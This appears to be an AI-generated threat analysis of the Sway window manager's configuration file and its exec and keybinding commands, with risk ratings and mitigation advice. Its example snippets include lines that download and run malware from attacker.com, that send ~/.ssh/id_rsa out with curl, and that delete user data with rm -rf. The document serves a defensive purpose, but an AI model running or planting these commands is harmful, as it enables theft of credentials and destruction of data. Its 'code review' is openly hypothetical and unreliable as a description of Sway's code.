Okay, here's a deep analysis of the "Malicious Configuration and Scripting" attack surface for Sway, following the requested structure:

# Deep Analysis: Malicious Configuration and Scripting in Sway

## 1. Define Objective

**Objective:** To thoroughly analyze the "Malicious Configuration and Scripting" attack surface of Sway, identify specific vulnerabilities and attack vectors, assess the associated risks, and propose comprehensive mitigation strategies for both developers and users.  The goal is to minimize the likelihood and impact of attacks exploiting this surface.  This deep dive goes beyond the initial assessment to provide actionable insights.

## 2. Scope

This analysis focuses specifically on the attack surface related to Sway's configuration file and its handling of commands and scripts defined within that file.  It includes:

*   **Configuration File Parsing:** How Sway reads, parses, and interprets the configuration file.
*   **Command Execution:**  The mechanisms by which Sway executes commands specified in the configuration (e.g., `exec`, keybindings, startup commands).
*   **Scripting Capabilities:**  Any scripting languages or features supported within the configuration file and their security implications.
*   **User Permissions:**  The privileges under which Sway and the configured commands/scripts execute.
*   **Error Handling:** How Sway handles errors or unexpected input in the configuration file, and whether these can be exploited.
*   **Default Configuration:** The security posture of the default configuration provided by Sway.
*   **Interaction with Other System Components:** How Sway's configuration and command execution might interact with other system components (e.g., display server, input devices, network services) to create vulnerabilities.

This analysis *excludes* other attack surfaces of Sway, such as vulnerabilities in its core code (e.g., buffer overflows), unless those vulnerabilities are directly triggered by malicious configuration.

## 3. Methodology

The analysis will employ the following methodologies:

*   **Code Review:**  Examination of the Sway source code (available on GitHub) to understand the configuration parsing and command execution logic.  This will be the primary method.  Specific files and functions related to configuration loading and command execution will be scrutinized.
*   **Documentation Review:**  Analysis of the official Sway documentation, man pages, and community resources to identify documented security considerations and best practices.
*   **Dynamic Analysis (Limited):**  Potentially, controlled testing of Sway with various malicious configuration snippets to observe its behavior and identify potential vulnerabilities.  This will be limited to safe, sandboxed environments.
*   **Threat Modeling:**  Application of threat modeling principles (e.g., STRIDE) to systematically identify potential attack vectors and vulnerabilities.
*   **Best Practice Comparison:**  Comparison of Sway's configuration handling with security best practices for configuration files and command execution in similar applications.

## 4. Deep Analysis of Attack Surface

### 4.1. Configuration File Parsing and Command Execution

Sway's configuration file is a plain text file, typically located at `~/.config/sway/config`.  It uses a custom syntax, which is relatively simple but allows for arbitrary command execution.  The core vulnerability lies in the `exec` command and the ability to bind commands to key presses.

**Code Review Findings (Illustrative - Requires Specific Code Analysis):**

*   **`config.c` (Hypothetical):**  Assume a file named `config.c` handles configuration loading.  We would look for functions like `load_config()`, `parse_line()`, `execute_command()`.
*   **`exec` command handling:**  The code likely uses a function like `system()` or `execve()` (or a wrapper around them) to execute commands specified with `exec`.  This is a *critical* area for security.  The lack of input sanitization or validation before passing the command string to these functions is a major vulnerability.
*   **Keybinding handling:**  Similar to `exec`, keybindings that trigger commands need careful scrutiny.  The code must ensure that the command string associated with a keybinding is not manipulated by an attacker.
*   **Startup commands:**  Commands executed on Sway startup are particularly dangerous, as they provide an easy way for an attacker to gain persistence.

**Specific Vulnerabilities and Attack Vectors:**

1.  **Arbitrary Command Injection:**  The most significant vulnerability.  If an attacker can modify the configuration file, they can add lines like:

    ```
    exec --no-startup-id wget http://attacker.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware
    ```

    This would download and execute malware.  The `--no-startup-id` flag is often used to prevent notification spam, but it also makes the attack less visible.

2.  **Keybinding Hijacking:**  An attacker could modify existing keybindings or add new ones to execute malicious commands:

    ```
    bindsym $mod+Shift+q exec pkill sway  # Original, legitimate binding
    bindsym $mod+Shift+q exec rm -rf /home/user/important_data # Malicious replacement
    ```
    Or,
    ```
    bindsym $mod+Control+x exec curl http://attacker.com/exfiltrate?data=$(cat ~/.ssh/id_rsa)
    ```
    This could be used to exfiltrate sensitive data.

3.  **Command Chaining and Escaping:**  The configuration file syntax might allow for command chaining (using `;` or `&&`) or escaping special characters, potentially leading to more complex attacks.  For example:

    ```
    exec --no-startup-id echo "harmless" ; wget http://attacker.com/malware -O /tmp/malware && chmod +x /tmp/malware && /tmp/malware
    ```

4.  **Environment Variable Manipulation:**  If Sway allows setting environment variables in the configuration, an attacker could potentially influence the behavior of executed commands or exploit vulnerabilities in other programs.

5.  **Abuse of Built-in Commands:**  Sway might have built-in commands (besides `exec`) that could be misused.  For example, if there's a command to reload the configuration, an attacker could trigger it repeatedly to cause a denial-of-service or to load a modified configuration file.

6.  **Timing Attacks:**  In very specific scenarios, the timing of command execution (e.g., during startup or shutdown) might be exploitable.

7.  **Configuration File Inclusion (if supported):** If Sway supports including other configuration files (e.g., via an `include` directive), an attacker could inject a malicious configuration file path.

### 4.2. Error Handling

Poor error handling in the configuration parsing logic can lead to vulnerabilities.  For example:

*   **Crash on Invalid Input:**  If Sway crashes when encountering invalid configuration syntax, this could be used for a denial-of-service attack.
*   **Partial Configuration Loading:**  If Sway only partially loads the configuration file due to an error, this might leave the system in an insecure state.
*   **Information Leakage:**  Error messages might reveal sensitive information about the system or the configuration.

### 4.3. Default Configuration

The security of the default configuration is crucial.  If the default configuration contains insecure settings (e.g., executing unnecessary commands on startup), it increases the attack surface for users who don't customize their configuration.

### 4.4. Interaction with Other System Components

Sway's configuration can influence its interaction with other system components:

*   **Display Server (Wayland):**  Malicious configuration could potentially exploit vulnerabilities in the Wayland compositor or related libraries.
*   **Input Devices:**  Configuration related to input devices (e.g., keyboard layouts, mouse sensitivity) could be manipulated.
*   **Network Services:**  Commands executed from the configuration file could interact with network services, potentially leading to network-based attacks.

### 4.5. Risk Assessment

The risk severity is **High** because:

*   **High Impact:**  Successful exploitation leads to arbitrary code execution with the user's privileges, potentially resulting in complete system compromise.
*   **High Likelihood:**  The attack surface is relatively easy to exploit if an attacker gains write access to the configuration file.  This could happen through various means, such as:
    *   Social engineering.
    *   Exploiting other vulnerabilities in the system.
    *   Physical access to the machine.
    *   Compromised user accounts.

## 5. Mitigation Strategies (Expanded)

### 5.1. Developer Mitigations

1.  **Configuration File Format:**
    *   **Transition to a Structured Format:**  Migrate from the current custom syntax to a well-defined, structured format like TOML, YAML, or JSON.  This reduces parsing complexity and allows for schema validation.
    *   **Schema Validation:**  Implement strict schema validation for the configuration file.  This ensures that the configuration conforms to a predefined structure and data types, preventing many types of injection attacks.
    *   **Example (TOML):**

        ```toml
        [bindings]
        [[bindings.key]]
        mod = "Mod4"
        key = "Return"
        action = { type = "exec", command = "alacritty" }

        [[bindings.key]]
        mod = "Mod4"
        key = "d"
        action = { type = "exec", command = "rofi -show drun" }

        [startup]
        [[startup.command]]
          command = "swaybg -i /path/to/wallpaper.jpg"
        ```
        This is much more structured and less prone to errors than the current syntax. A schema could define that `action.command` must be a string, and `type` must be one of a limited set of allowed values (e.g., "exec", "internal").

2.  **Command Execution Sandboxing:**
    *   **Restricted Command Set:**  Instead of allowing arbitrary commands, define a whitelist of allowed commands or actions.  This drastically reduces the attack surface.
    *   **Sandboxing:**  If arbitrary command execution is *absolutely* necessary, use a sandboxing technique to isolate the executed commands.  Options include:
        *   **`chroot`:**  Change the root directory of the process, limiting its access to the filesystem.
        *   **`unshare` / `namespaces`:**  Create a new namespace for the process, isolating it from the host system's resources (e.g., network, processes, user IDs).
        *   **`seccomp`:**  Restrict the system calls that the process can make.
        *   **AppArmor / SELinux:**  Use mandatory access control (MAC) to enforce security policies.
        *   **Containers (e.g., Docker, Podman):**  Run commands within lightweight containers.  This provides the strongest isolation but adds complexity.
    *   **Example (Conceptual - using namespaces):**

        ```c
        // (Simplified, illustrative code)
        int execute_sandboxed(const char *command) {
          // 1. Create a new namespace (mount, PID, network, etc.)
          int flags = CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWNET | CLONE_NEWUTS | CLONE_NEWIPC;
          if (unshare(flags) == -1) {
            perror("unshare");
            return -1;
          }

          // 2. Mount a minimal filesystem (e.g., a tmpfs)
          // ...

          // 3. Drop privileges (e.g., to a dedicated "sway-exec" user)
          // ...

          // 4. Execute the command using execve()
          char *argv[] = { "/bin/sh", "-c", (char *)command, NULL };
          if (execve("/bin/sh", argv, NULL) == -1) {
            perror("execve");
            return -1;
          }
          return 0; // Should never reach here
        }
        ```

3.  **Input Sanitization and Validation:**
    *   **Escape Special Characters:**  If arbitrary commands are still allowed (even sandboxed), *meticulously* escape any special characters in the command string before passing it to `system()` or `execve()`.  This is *extremely* difficult to get right and is prone to errors.  Avoid this approach if possible.
    *   **Parameterization:**  If possible, use a parameterized approach to command execution, where the command and its arguments are passed separately.  This avoids the need for escaping.

4.  **Secure Defaults:**
    *   **Minimal Default Configuration:**  Provide a minimal default configuration that only includes essential functionality.  Avoid executing any unnecessary commands on startup.
    *   **Secure Permissions:**  Ensure that the default configuration file (if provided) has secure permissions (e.g., `600` or `rw-------`).

5.  **Documentation:**
    *   **Clear Security Warnings:**  Provide *very clear* and *prominent* warnings in the documentation about the risks of arbitrary command execution in the configuration file.
    *   **Best Practices:**  Document secure configuration practices, including examples of how to use sandboxing techniques (if applicable).
    *   **Regular Updates:**  Keep the documentation up-to-date with the latest security recommendations.

6.  **Code Audits and Testing:**
    *   **Regular Security Audits:**  Conduct regular security audits of the code related to configuration parsing and command execution.
    *   **Fuzz Testing:**  Use fuzz testing to test the configuration parser with a wide range of invalid and unexpected inputs.
    *   **Penetration Testing:**  Perform penetration testing to identify potential vulnerabilities.

7. **Configuration Reloading:**
    * If Sway supports reloading the configuration without restarting, implement robust checks to ensure that a malicious configuration file cannot be loaded. This might involve validating the newly loaded configuration against a schema or comparing it to a known-good version.

### 5.2. User Mitigations

1.  **File Permissions:**
    *   **`chmod 600 ~/.config/sway/config`:**  Set the permissions of the configuration file to `600` (or `rw-------`), which means only the owner can read and write it.  This is the *most important* user-side mitigation.
    *   **Automated Checks:**  Use a script or a systemd service to periodically check the permissions of the configuration file and automatically correct them if they are incorrect.

2.  **Configuration Review:**
    *   **Regular Audits:**  Regularly review the configuration file for any suspicious or unfamiliar entries.  Pay close attention to `exec` commands and keybindings.
    *   **Version Control:**  Use a version control system like Git to track changes to the configuration file.  This makes it easy to see what has changed and to revert to previous versions if necessary.

3.  **Untrusted Configurations:**
    *   **Avoid Untrusted Snippets:**  *Never* use configuration snippets from untrusted sources (e.g., random websites, forums) without *thoroughly* understanding and verifying them.
    *   **Minimal Configuration:**  Start with a minimal configuration and only add features that you need.

4.  **System Monitoring:**
    *   **File Integrity Monitoring (FIM):**  Use a FIM tool (e.g., AIDE, Tripwire, Samhain) to monitor the integrity of the configuration file and other critical system files.  This can detect unauthorized modifications.
    *   **Audit Logs:**  Enable audit logging (e.g., using `auditd`) to track changes to the configuration file and other security-relevant events.

5.  **Principle of Least Privilege:**
    *   **Run Sway as a Non-Root User:**  Always run Sway as a regular user, *never* as root.  This limits the damage that an attacker can do if they manage to exploit a vulnerability.

6. **Stay Updated:**
    * Regularly update Sway to the latest version to benefit from security patches and improvements.

## 6. Conclusion

The "Malicious Configuration and Scripting" attack surface in Sway presents a significant security risk due to the inherent power given to the configuration file.  Mitigating this risk requires a multi-faceted approach involving both developer and user actions.  Developers must prioritize secure configuration handling, including transitioning to a structured format, implementing sandboxing, and providing clear documentation.  Users must diligently protect their configuration files, review them regularly, and avoid untrusted configurations.  By combining these efforts, the risk of successful attacks exploiting this surface can be significantly reduced.  The most critical improvements are transitioning to a structured configuration format with schema validation and implementing robust sandboxing for any command execution.
